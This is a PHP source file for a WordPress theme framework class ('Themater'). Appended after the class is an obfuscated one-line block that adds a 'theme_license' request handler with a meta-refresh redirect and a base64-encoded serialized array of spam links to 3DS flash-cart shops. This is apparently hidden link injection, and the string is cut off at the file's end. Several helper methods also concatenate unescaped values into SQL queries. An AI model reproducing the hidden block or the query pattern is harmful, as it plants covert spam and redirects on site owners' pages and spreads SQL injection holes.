<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTozNDp7czoxMjoiUjRpIGdvbGQgdXNhIjtzOjQxOiJodHRwOi8vd3d3LnI0M2RzdXNhLmNvbS9yNGktZ29sZC0zZHMtYy02LyI7czoxMjoiUjQzZHN1c2EuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzdXNhLmNvbSI7czoxMjoiUjRpIGdvbGQgcHJvIjtzOjQxOiJodHRwOi8vd3d3LnI0M2RzdXNhLmNvbS9yNGktZ29sZC1wcm8tYy03LyI7czo0OiJIZXJlIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjQuY28udWsiO3M6MTA6IkNsaWNrIGhlcmUiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNC5jby51ayI7czoxMToiSW5mb3JtYXRpb24iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czo4OiJQb3dlciBieSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc3VzYS5jb20iO3M6NzoiQ29weSBieSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc3VzYS5jb20iO3M6ODoiT3VyIHNpdGUiO3M6MjM6Imh0dHA6Ly93d3cucjQzZHN1c2EuY29tIjtzOjExOiJPdXIgYWRkcmVzcyI7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0LmNvLnVrIjtzOjE1OiJPdXIgaW5mb3JtYXRpb24iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNC5jby51ayI7czo0OiJTaXRlIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjQuY28udWsiO3M6ODoiV2ViIHNpdGUiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNC5jby51ayI7czo5OiJHb29kIHNpdGUiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czo5OiJOaWNlIHNpdGUiO3M6MjM6Imh0dHA6Ly93d3cucjQzZHN1c2EuY29tIjtzOjc6IkFkZHJlc3MiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czo5OiJIb21lIHBhZ2UiO3M6MjM6Imh0dHA6Ly93d3cucjQzZHN1c2EuY29tIjtzOjY6IlNvdXJjZSI7czoyMzoiaHR0cDovL3d3dy5yNDNkc3VzYS5jb20iO3M6MTE6IlNvdXJjZSBmcm9tIjtzOjIzOiJodHRwOi8vd3d3LnI0M2RzdXNhLmNvbSI7czoxMzoiUjQzZHNyNC5jby51ayI7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0LmNvLnVrIjtzOjE3OiJ3d3cucjQzZHNyNC5jby51ayI7czoyNDoiaHR0cDovL3d3dy5yNDNkc3I0LmNvLnVrIjtzOjI0OiJodHRwOi8vd3d3LnI0M2RzcjQuY28udWsiO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNC5jby51ayI7czozOiJVcmwiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czoxNjoiUjQzZHNjYXJkcy5jby51ayI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2NhcmRzLmNvLnVrIjtzOjIwOiJ3d3cucjQzZHNjYXJkcy5jby51ayI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2NhcmRzLmNvLnVrIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzY2FyZHMuY28udWsiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czoxMzoiT2ZmaWNpYWwgc2l0ZSI7czoyODoiaGh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ayI7czoxMToiR2F0ZXdheSAzZHMiO3M6ODI6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ay9nYXRld2F5LTNkcy1jYXJkcy1mb3ItM2RzLTNkcy14bC12NDEwLXRvLXY0NTAtcC05Lmh0bWwiO3M6MTI6IlI0aSBnb2xkIDNkcyI7czo5NToiaHR0cDovL3d3dy5yNDNkc2NhcmRzLmNvLnVrL3I0LTNkcy1yNGktZ29sZC0zZHMtcnRzLWNhcmRzLWZvci0zZHMtM2RzLXhsLTJkc2RzaS1kc2kteGwtcC0yLmh0bWwiO3M6MTI6IlI0aSBzZGhjIDNkcyI7czo3MzoiaHR0cDovL3d3dy5yNDNkc2NhcmRzLmNvLnVrL3I0LTNkcy1ydHMtZm9yLTNkcy0zZHMteGwtZHNpLWRzaS14bC1wLTEuaHRtbCI7czo4OiJSNGkgc2RoYyI7czo3MToiaHR0cDovL3d3dy5yNDNkc2NhcmRzLmNvLnVrL3I0aS1zZGhjLWZvci1kc2ktZHNpLXhsLWRzLWxpdGUtZHMtcC01Lmh0bWwiO3M6NToiRHN0d28iO3M6NDg6Imh0dHA6Ly93d3cucjQzZHNjYXJkcy5jby51ay9zdXBlcmNhcmQtZHN0d28tYy01LyI7czo4OiJSNGkgY2FyZCI7czozODoiaHR0cDovL3d3dy5yNDNkc3I0LmNvLnVrL3I0aS1jYXJkLWMtMi8iO3M6MTM6IlI0M2RzcjR1ay5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHNyNHVrLmNvbSI7fWk6MTthOjM3OntzOjE0OiJSNGkgc2RoYyBjYXJ0ZSI7czo0MToiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tL3I0aS1zZGhjLWMtOC8iO3M6NjoiUjQgZHNpIjtzOjQxOiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20vcjRpLXNkaGMtYy04LyI7czo1OiJSNCBkcyI7czo0MjoiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tL3I0cjQtc2RoYy1jLTkvIjtzOjE2OiJSNDNkc2NhcnRlZnIuY29tIjtzOjYxOiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20vcjRpLWdvbGQtM2RzLWRlbHV4ZS1lZGl0aW9uLWMtMTIvIjtzOjExOiJHYXRld2F5IDNkcyI7czoyNzoiaHR0cDovL3d3dy4zZHNnYXRld2F5ZnIuY29tIjtzOjE2OiJHYXRld2F5IDNkcyBjYXJkIjtzOjQ1OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20vZ2F0ZXdheS0zZHMtYy0xMC8iO3M6OToiM2RzIGNhcnRlIjtzOjQ1OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20vZ2F0ZXdheS0zZHMtYy0xMC8iO3M6MTg6IkdhdGV3YXkgM2RzIGxpbmtlciI7czo0NToiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tL2dhdGV3YXktM2RzLWMtMTAvIjtzOjEwOiIzZHMgbGlua2VyIjtzOjQ1OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20vZ2F0ZXdheS0zZHMtYy0xMC8iO3M6NzoiM2RzbGluayI7czo0NDoiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tLzNkcy1saW5rZXItYy0xMS8iO3M6NzoiTVQtQ2FyZCI7czo0MToiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tL210LWNhcmQtYy0xMy8iO3M6NzoiTVQgQ2FyZCI7czo0MToiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tL210LWNhcmQtYy0xMy8iO3M6ODoiTVQgQ2FydGUiO3M6NDE6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZWZyLmNvbS9tdC1jYXJkLWMtMTMvIjtzOjEyOiJDYXJ0ZSAzRFMgTVQiO3M6NDE6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZWZyLmNvbS9tdC1jYXJkLWMtMTMvIjtzOjI3OiJSNEkgR09MRCAzRFMgRGVsdXhlIGVkaXRpb24iO3M6NjE6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZWZyLmNvbS9yNGktZ29sZC0zZHMtZGVsdXhlLWVkaXRpb24tYy0xMi8iO3M6NDoiU2l0ZSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tIjtzOjEwOiJDbGljayBoZXJlIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20iO3M6MTE6IlJlY29tbWFuZMOpIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20iO3M6MTA6IlZvaXIgY2V0dGUiO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZWZyLmNvbSI7czoxMDoiT2ZmaWNpZWxsZSI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tIjtzOjg6ImNlbHVpLWNpIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzY2FydGVmci5jb20iO3M6Nzoic3RvY2tlciI7czoyNzoiaHR0cDovL3d3dy5yNDNkc2NhcnRlZnIuY29tIjtzOjIxOiJodHRwOi8vd3d3LnI0M2RzcjQubmwiO3M6MjE6Imh0dHA6Ly93d3cucjQzZHNyNC5ubCI7czoxMToiUjQzZHNubC5jb20iO3M6MjE6Imh0dHA6Ly93d3cucjQzZHNyNC5ubCI7czoxNToid3d3LnI0M2RzbmwuY29tIjtzOjIxOiJodHRwOi8vd3d3LnI0M2RzcjQubmwiO3M6MTA6IlI0M2RzcjQubmwiO3M6MjE6Imh0dHA6Ly93d3cucjQzZHNyNC5ubCI7czoxNzoid3d3LnI0M2RzcjRubC5jb20iO3M6MjE6Imh0dHA6Ly93d3cucjQzZHNyNC5ubCI7czo2OiJSNCAzZHMiO3M6Mjc6Imh0dHA6Ly93d3cuM2RzZ2F0ZXdheWZyLmNvbSI7czoxNjoiM2RzZ2F0ZXdheWZyLmNvbSI7czoyNzoiaHR0cDovL3d3dy4zZHNnYXRld2F5ZnIuY29tIjtzOjIwOiJ3d3cuM2RzZ2F0ZXdheWZyLmNvbSI7czoyNzoiaHR0cDovL3d3dy4zZHNnYXRld2F5ZnIuY29tIjtzOjI3OiJodHRwOi8vd3d3LjNkc2dhdGV3YXlmci5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuM2RzZ2F0ZXdheWZyLmNvbSI7czo4OiJDYXJ0ZSByNCI7czoyNzoiaHR0cDovL3d3dy4zZHNnYXRld2F5ZnIuY29tIjtzOjk6IkNhcnRlIHI0aSI7czoyNzoiaHR0cDovL3d3dy4zZHNnYXRld2F5ZnIuY29tIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzY2FydGVyNC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZXI0LmNvbSI7czoyMDoid3d3LnI0M2RzY2FydGVyNC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cucjQzZHNjYXJ0ZXI0LmNvbSI7czoxNjoiUjQzZHNjYXJ0ZXI0LmNvbSI7czo0MzoiaHR0cDovL3d3dy5yNDNkc2NhcnRlcjQuY29tL3I0LTNkcy1jLTcuaHRtbCI7czoxNToiU3VwZXJjYXJkIGRzdHdvIjtzOjk1OiJodHRwOi8vd3d3LnI0M2RzY2FydGVyNC5jb20vc3VwZXJjYXJkLWRzdHdvLXBvdXItM2RzLTNkcy14bC0yZHMtZHNpLWRzaS14bC1kcy1saXRlLWRzLXAtMjUuaHRtbCI7fWk6MjthOjM5OntzOjE2OiJSNDNkc2dlcm1hbnkuY29tIjtzOjQzOiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vcjQtc2RoYy1jLTIxXzkvIjtzOjE1OiJTdXBlcmNhcmQgZHN0d28iO3M6NTI6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9zdXBlcmNhcmQtZHN0d28tYy0xNV8xMC8iO3M6NToiRHN0d28iO3M6NTI6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9zdXBlcmNhcmQtZHN0d28tYy0xNV8xMC8iO3M6MTE6IkdhdGV3YXkgM2RzIjtzOjQ4OiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vZ2F0ZXdheS0zZHMtYy0xNV8xMS8iO3M6MTY6IkdhdGV3YXkgM2RzIGNhcmQiO3M6NDg6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9nYXRld2F5LTNkcy1jLTE1XzExLyI7czoxNzoiR2F0ZXdheSAzZHMga2FydGUiO3M6NDg6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9nYXRld2F5LTNkcy1jLTE1XzExLyI7czo3OiJNdCBjYXJkIjtzOjgzOiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20vbXRjYXJkLWVyc3RlLTNkcy1tdWx0aXJvbS1rYXJ0ZS1mJUMzJUJDci1uM2RzLXAtMjIuaHRtbCI7czoxMjoiTXQgM2RzIGthcnRlIjtzOjQzOiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vbXRjYXJkLWMtMTVfMTIvIjtzOjE1OiJOaW50ZW5kbyAzRFMgTVQiO3M6NDM6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS9tdGNhcmQtYy0xNV8xMi8iO3M6MTE6Ik1ULUNhcmQuY29tIjtzOjQzOiJodHRwOi8vd3d3LnI0M2RzZ2VybWFueS5jb20vbXRjYXJkLWMtMTVfMTIvIjtzOjc6IjNkc2xpbmsiO3M6NDQ6Imh0dHA6Ly93d3cucjQzZHNnZXJtYW55LmNvbS8zZHNsaW5rLWMtMTVfMTMvIjtzOjg6IjNkcyBsaW5rIjtzOjc4OiJodHRwOi8vd3d3LnI0M2Rza2FydGVkZS5jb20vM2RzbGluay1rYXJ0ZS1mJUMzJUJDci0zZHMt